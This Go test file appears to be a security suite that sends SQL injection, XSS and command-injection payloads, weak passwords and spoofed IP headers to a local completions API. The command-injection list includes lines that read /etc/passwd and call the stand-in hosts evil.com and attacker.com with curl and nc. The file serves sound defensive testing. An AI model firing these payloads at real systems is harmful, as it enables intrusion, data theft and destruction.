package security

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"regexp"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// SecurityTestConfig holds configuration for security tests
type SecurityTestConfig struct {
	BaseURL string
	Timeout time.Duration
}

// VulnerabilityResult holds vulnerability scan results
type VulnerabilityResult struct {
	VulnerabilityType string
	Description       string
	URL               string
	StatusCode        int
	Response          string
	Severity          string // "Low", "Medium", "High", "Critical"
}

// checkServerAvailable checks if the test server is reachable
func checkServerAvailable(baseURL string, timeout time.Duration) bool {
	client := &http.Client{Timeout: timeout}
	resp, err := client.Get(baseURL + "/health")
	if err != nil {
		return false
	}
	resp.Body.Close()
	return true
}

// TestInputValidation tests for input validation vulnerabilities
func TestInputValidation(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping security test in short mode")
	}

	config := SecurityTestConfig{
		BaseURL: "http://localhost:7061",
		Timeout: 30 * time.Second,
	}

	// Skip if server is not available
	if !checkServerAvailable(config.BaseURL, 5*time.Second) {
		t.Skip("Skipping security test - server not available at " + config.BaseURL)
	}

	t.Run("SQLInjection", func(t *testing.T) {
		sqlInjectionPayloads := []string{
			"' OR '1'='1",
			"'; DROP TABLE users; --",
			"' UNION SELECT * FROM users --",
			"1' OR '1'='1' --",
			"admin'--",
			"admin' /*",
			"' OR 1=1--",
			"' OR 1=1#",
			"' OR 1=1/*",
			") OR (1=1 --",
		}

		client := &http.Client{Timeout: config.Timeout}
		vulnerabilities := []VulnerabilityResult{}

		for _, payload := range sqlInjectionPayloads {
			requestBody := map[string]interface{}{
				"prompt": payload,
				"model":  "gpt-3.5-turbo",
			}

			jsonData, _ := json.Marshal(requestBody)
			resp, err := client.Post(config.BaseURL+"/v1/completions", "application/json", bytes.NewBuffer(jsonData))
			require.NoError(t, err)
			defer resp.Body.Close()

			body, _ := io.ReadAll(resp.Body)
			bodyStr := string(body)

			// Check for SQL error messages in response
			sqlErrorPatterns := []string{
				"sql syntax",
				"mysql_fetch",
				"ora-", "oracle",
				"sqlserver",
				"postgresql",
				"sqlite_",
			}

			for _, pattern := range sqlErrorPatterns {
				if strings.Contains(strings.ToLower(bodyStr), pattern) {
					vulnerabilities = append(vulnerabilities, VulnerabilityResult{
						VulnerabilityType: "SQL Injection",
						Description:       "Potential SQL injection vulnerability detected",
						URL:               config.BaseURL + "/v1/completions",
						StatusCode:        resp.StatusCode,
						Response:          bodyStr,
						Severity:          "High",
					})
				}
			}
		}

		// Report findings
		if len(vulnerabilities) > 0 {
			t.Errorf("Found %d potential SQL injection vulnerabilities:", len(vulnerabilities))
			for _, vuln := range vulnerabilities {
				t.Errorf("  - %s: %s", vuln.VulnerabilityType, vuln.Description)
			}
		} else {
			t.Logf("✅ No SQL injection vulnerabilities detected")
		}
	})

	t.Run("XSS", func(t *testing.T) {
		xssPayloads := []string{
			"<script>alert('xss')</script>",
			"javascript:alert('xss')",
			"<img src=x onerror=alert('xss')>",
			"'><script>alert('xss')</script>",
			"<svg onload=alert('xss')>",
			"\";alert('xss');//",
		}

		client := &http.Client{Timeout: config.Timeout}
		vulnerabilities := []VulnerabilityResult{}

		for _, payload := range xssPayloads {
			requestBody := map[string]interface{}{
				"prompt": payload,
				"model":  "gpt-3.5-turbo",
			}

			jsonData, _ := json.Marshal(requestBody)
			resp, err := client.Post(config.BaseURL+"/v1/completions", "application/json", bytes.NewBuffer(jsonData))
			require.NoError(t, err)
			defer resp.Body.Close()

			body, _ := io.ReadAll(resp.Body)
			bodyStr := string(body)

			// Check if XSS payload is reflected unencoded
			if strings.Contains(bodyStr, payload) && !strings.Contains(bodyStr, strings.ReplaceAll(payload, "<", "&lt;")) {
				vulnerabilities = append(vulnerabilities, VulnerabilityResult{
					VulnerabilityType: "Cross-Site Scripting (XSS)",
					Description:       "Potential XSS vulnerability - payload reflected unencoded",
					URL:               config.BaseURL + "/v1/completions",
					StatusCode:        resp.StatusCode,
					Response:          bodyStr,
					Severity:          "Medium",
				})
			}
		}

		if len(vulnerabilities) > 0 {
			t.Errorf("Found %d potential XSS vulnerabilities:", len(vulnerabilities))
			for _, vuln := range vulnerabilities {
				t.Errorf("  - %s: %s", vuln.VulnerabilityType, vuln.Description)
			}
		} else {
			t.Logf("✅ No XSS vulnerabilities detected")
		}
	})

	t.Run("CommandInjection", func(t *testing.T) {
		cmdInjectionPayloads := []string{
			"; ls -la",
			"| cat /etc/passwd",
			"`whoami`",
			"$(id)",
			"; curl http://evil.com",
			"| nc attacker.com 4444",
		}

		client := &http.Client{Timeout: config.Timeout}
		vulnerabilities := []VulnerabilityResult{}

		for _, payload := range cmdInjectionPayloads {
			requestBody := map[string]interface{}{
				"prompt": payload,
				"model":  "gpt-3.5-turbo",
			}

			jsonData, _ := json.Marshal(requestBody)
			resp, err := client.Post(config.BaseURL+"/v1/completions", "application/json", bytes.NewBuffer(jsonData))
			require.NoError(t, err)
			defer resp.Body.Close()

			body, _ := io.ReadAll(resp.Body)
			bodyStr := string(body)

			// Check for command injection indicators
			cmdPatterns := []string{
				"uid=", "gid=", "groups=",
				"root:", "daemon:", "bin:",
				"total \\d+", "drwxr-xr-x",
				"connection refused", "connection established",
			}

			for _, pattern := range cmdPatterns {
				if regexp.MustCompile(pattern).MatchString(strings.ToLower(bodyStr)) {
					vulnerabilities = append(vulnerabilities, VulnerabilityResult{
						VulnerabilityType: "Command Injection",
						Description:       "Potential command injection vulnerability",
						URL:               config.BaseURL + "/v1/completions",
						StatusCode:        resp.StatusCode,
						Response:          bodyStr,
						Severity:          "Critical",
					})
				}
			}
		}

		if len(vulnerabilities) > 0 {
			t.Errorf("Found %d potential command injection vulnerabilities:", len(vulnerabilities))
			for _, vuln := range vulnerabilities {
				t.Errorf("  - %s: %s", vuln.VulnerabilityType, vuln.Description)
			}
		} else {
			t.Logf("✅ No command injection vulnerabilities detected")
		}
	})
}

// TestAuthenticationSecurity tests authentication and authorization
func TestAuthenticationSecurity(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping authentication security test in short mode")
	}

	config := SecurityTestConfig{
		BaseURL: "http://localhost:7061",
		Timeout: 30 * time.Second,
	}

	// Skip if server is not available
	if !checkServerAvailable(config.BaseURL, 5*time.Second) {
		t.Skip("Skipping security test - server not available at " + config.BaseURL)
	}

	t.Run("UnauthorizedAccess", func(t *testing.T) {
		client := &http.Client{Timeout: config.Timeout}

		// Test endpoints that should require authentication (if any)
		protectedEndpoints := []string{
			"/v1/admin/users",
			"/v1/admin/stats",
			"/admin/panel",
		}

		for _, endpoint := range protectedEndpoints {
			resp, err := client.Get(config.BaseURL + endpoint)
			require.NoError(t, err)
			defer resp.Body.Close()

			// Should return 401 or 404 (if endpoint doesn't exist)
			if resp.StatusCode == http.StatusOK {
				t.Errorf("Endpoint %s should require authentication but is accessible", endpoint)
			} else if resp.StatusCode == http.StatusUnauthorized || resp.StatusCode == http.StatusForbidden {
				t.Logf("✅ Endpoint %s properly protected (status: %d)", endpoint, resp.StatusCode)
			}
		}
	})

	t.Run("WeakAuthentication", func(t *testing.T) {
		client := &http.Client{Timeout: config.Timeout}

		// Test common weak credentials (if there's authentication)
		weakCredentials := []struct {
			username string
			password string
		}{
			{"admin", "admin"},
			{"admin", "password"},
			{"root", "root"},
			{"user", "user"},
			{"test", "test"},
		}

		for _, creds := range weakCredentials {
			req, _ := http.NewRequest("GET", config.BaseURL+"/v1/models", nil)
			req.SetBasicAuth(creds.username, creds.password)

			resp, err := client.Do(req)
			require.NoError(t, err)
			defer resp.Body.Close()

			// If basic auth is supported, weak credentials should not work
			if resp.StatusCode == http.StatusOK {
				t.Logf("⚠️  Weak credentials (user: %s) worked - this should be reviewed", creds.username)
			}
		}

		t.Logf("✅ Weak authentication test completed")
	})
}

// TestRateLimitingSecurity tests rate limiting mechanisms
func TestRateLimitingSecurity(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping rate limiting security test in short mode")
	}

	config := SecurityTestConfig{
		BaseURL: "http://localhost:7061",
		Timeout: 30 * time.Second,
	}

	t.Run("RateLimitBypass", func(t *testing.T) {
		client := &http.Client{Timeout: config.Timeout}

		// Send rapid requests to test rate limiting
		successCount := 0
		rateLimitHit := false

		for i := 0; i < 100; i++ {
			resp, err := client.Get(config.BaseURL + "/v1/models")
			if err != nil {
				continue
			}
			defer resp.Body.Close()

			if resp.StatusCode == http.StatusOK {
				successCount++
			} else if resp.StatusCode == http.StatusTooManyRequests {
				rateLimitHit = true
				break
			}

			// Small delay between requests
			time.Sleep(10 * time.Millisecond)
		}

		t.Logf("Rate limiting test: %d successful requests, rate limit hit: %v",
			successCount, rateLimitHit)

		if successCount > 50 && !rateLimitHit {
			t.Logf("⚠️  High number of successful requests - rate limiting may need adjustment")
		} else {
			t.Logf("✅ Rate limiting appears to be working")
		}
	})

	t.Run("RateLimitCircumvention", func(t *testing.T) {
		client := &http.Client{Timeout: config.Timeout}

		// Try to circumvent rate limiting with different headers
		headers := []map[string]string{
			{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
			{"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"},
			{"X-Forwarded-For": "192.168.1.1"},
			{"X-Real-IP": "10.0.0.1"},
			{"X-Originating-IP": "172.16.0.1"},
		}

		for _, header := range headers {
			req, _ := http.NewRequest("GET", config.BaseURL+"/v1/models", nil)
			for key, value := range header {
				req.Header.Set(key, value)
			}

			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			defer resp.Body.Close()

			if resp.StatusCode == http.StatusOK {
				t.Logf("Request with custom headers succeeded: %v", header)
			}
		}

		t.Logf("✅ Rate limit circumvention test completed")
	})
}

// TestTLSConfiguration tests TLS security (if applicable)
func TestTLSConfiguration(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping TLS security test in short mode")
	}

	config := SecurityTestConfig{
		BaseURL: "https://localhost:8443", // Assuming HTTPS on different port
		Timeout: 30 * time.Second,
	}

	t.Run("WeakTLSConfiguration", func(t *testing.T) {
		// Test for weak TLS configurations
		client := &http.Client{
			Timeout: config.Timeout,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,             // For testing only
					MinVersion:         tls.VersionTLS10, // Allow older versions for testing
				},
			},
		}

		// Try to connect with weak TLS
		resp, err := client.Get(config.BaseURL + "/health")
		if err == nil {
			defer resp.Body.Close()
			t.Logf("⚠️  Server accepts weak TLS configuration")

			// Check TLS version if available
			if resp.TLS != nil {
				t.Logf("TLS version: %x", resp.TLS.Version)
				if resp.TLS.Version < tls.VersionTLS12 {
					t.Errorf("Server uses weak TLS version: %x", resp.TLS.Version)
				}
			}
		} else {
			t.Logf("✅ Server rejects weak TLS configuration: %v", err)
		}
	})

	t.Run("CertificateValidation", func(t *testing.T) {
		// Test certificate validation
		client := &http.Client{
			Timeout: config.Timeout,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: false,
				},
			},
		}

		resp, err := client.Get(config.BaseURL + "/health")
		if err != nil {
			t.Logf("Certificate validation test: %v", err)
		} else {
			defer resp.Body.Close()
			if resp.TLS != nil && len(resp.TLS.PeerCertificates) > 0 {
				cert := resp.TLS.PeerCertificates[0]
				t.Logf("Certificate details:")
				t.Logf("  Subject: %s", cert.Subject)
				t.Logf("  Issuer: %s", cert.Issuer)
				t.Logf("  Not Before: %s", cert.NotBefore)
				t.Logf("  Not After: %s", cert.NotAfter)

				// Check certificate expiry
				if time.Now().After(cert.NotAfter) {
					t.Errorf("Certificate has expired")
				}
			}
		}
	})
}

// TestInformationDisclosure tests for information disclosure vulnerabilities
func TestInformationDisclosure(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping information disclosure test in short mode")
	}

	config := SecurityTestConfig{
		BaseURL: "http://localhost:7061",
		Timeout: 30 * time.Second,
	}

	// Skip if server is not available
	if !checkServerAvailable(config.BaseURL, 5*time.Second) {
		t.Skip("Skipping security test - server not available at " + config.BaseURL)
	}

	t.Run("ServerErrorMessages", func(t *testing.T) {
		client := &http.Client{Timeout: config.Timeout}

		// Trigger various error conditions
		errorEndpoints := []string{
			"/invalid-endpoint",
			"/v1/completions", // POST with invalid data
			"/v1/models/invalid",
		}

		for _, endpoint := range errorEndpoints {
			resp, err := client.Get(config.BaseURL + endpoint)
			if err != nil {
				continue
			}
			defer resp.Body.Close()

			body, _ := io.ReadAll(resp.Body)
			bodyStr := string(body)

			// Check for sensitive information in error messages
			sensitivePatterns := []string{
				"stack trace", "exception", "error in",
				"/var/www/", "/home/", "/etc/",
				"mysql", "postgresql", "sqlite",
				"internal server error", "500",
			}

			for _, pattern := range sensitivePatterns {
				if strings.Contains(strings.ToLower(bodyStr), pattern) {
					t.Logf("⚠️  Potential information disclosure in %s: contains '%s'", endpoint, pattern)
				}
			}
		}

		t.Logf("✅ Information disclosure test completed")
	})

	t.Run("HTTPHeaderSecurity", func(t *testing.T) {
		client := &http.Client{Timeout: config.Timeout}

		resp, err := client.Get(config.BaseURL + "/health")
		require.NoError(t, err)
		defer resp.Body.Close()

		// Check security headers
		securityHeaders := map[string]string{
			"X-Content-Type-Options":    "nosniff",
			"X-Frame-Options":           "DENY",
			"X-XSS-Protection":          "1; mode=block",
			"Strict-Transport-Security": "max-age=31536000",
			"Content-Security-Policy":   "",
		}

		missingHeaders := []string{}
		for header, expectedValue := range securityHeaders {
			value := resp.Header.Get(header)
			if value == "" {
				missingHeaders = append(missingHeaders, header)
			} else if expectedValue != "" && value != expectedValue {
				t.Logf("Header %s has value '%s', expected '%s'", header, value, expectedValue)
			}
		}

		if len(missingHeaders) > 0 {
			t.Logf("⚠️  Missing security headers: %v", missingHeaders)
		} else {
			t.Logf("✅ Security headers present")
		}
	})
}

// TestSecurityHeaders tests for proper security headers
func TestSecurityHeaders(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping security headers test in short mode")
	}

	config := SecurityTestConfig{
		BaseURL: "http://localhost:7061",
		Timeout: 30 * time.Second,
	}

	client := &http.Client{Timeout: config.Timeout}

	// Test multiple endpoints
	endpoints := []string{"/health", "/v1/models", "/metrics"}

	for _, endpoint := range endpoints {
		resp, err := client.Get(config.BaseURL + endpoint)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		t.Run(fmt.Sprintf("SecurityHeaders_%s", endpoint), func(t *testing.T) {
			// Check for security headers
			headers := map[string]bool{
				"X-Content-Type-Options":    resp.Header.Get("X-Content-Type-Options") != "",
				"X-Frame-Options":           resp.Header.Get("X-Frame-Options") != "",
				"X-XSS-Protection":          resp.Header.Get("X-XSS-Protection") != "",
				"Strict-Transport-Security": resp.Header.Get("Strict-Transport-Security") != "",
				"Content-Security-Policy":   resp.Header.Get("Content-Security-Policy") != "",
				"Referrer-Policy":           resp.Header.Get("Referrer-Policy") != "",
			}

			missingCount := 0
			for header, present := range headers {
				if present {
					t.Logf("✅ %s header present", header)
				} else {
					missingCount++
					t.Logf("⚠️  %s header missing", header)
				}
			}

			// At least basic security headers should be present
			assert.Less(t, missingCount, 4, "Should have at least basic security headers")
		})
	}
}
